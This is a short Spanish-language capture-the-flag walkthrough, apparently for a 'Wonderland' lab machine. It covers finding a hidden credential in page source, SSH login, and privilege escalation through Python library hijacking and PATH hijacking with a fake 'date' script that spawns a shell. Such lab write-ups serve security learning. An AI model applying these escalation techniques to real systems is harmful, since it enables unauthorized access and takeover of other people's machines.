1. Enumera hasta encontrar el ssh y la contraseña

**url**: `10.10.89.199/r/a/b/b/i/t/`
**en el código fuente**:
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
`<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`

2. Conectarse por ssh
```sh
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
```

3. ¿Que puedes ejecutar cómo admin?
```sh
# AQUÍ TE ESTÁ DICIENDO QUE PUEDES EJECUTAR walrus_and_the_carpenter con el usuario rabbit
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
4. Cómo el script de python no define exactamente dónde está la biblioteca (la ruta es relativa) podemos reemplazarla por la nuestra
```sh
# (en el mismo lugar dónde se ejecuta)
vim random.py # (escribir ejecutar shell y se ejecutará en walrus...)
/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
5. Una vez en rabbit
```sh
# Modificar $PATH (dónde se accede a los ejecutables, binarios)
# Como en tmp tenemos permisos escribimos un bash llamado "date" que nos de un bash
# #!/bin/bash
# /bin/bash
chmod +x date

# y Ejecutamos ./teaParty
```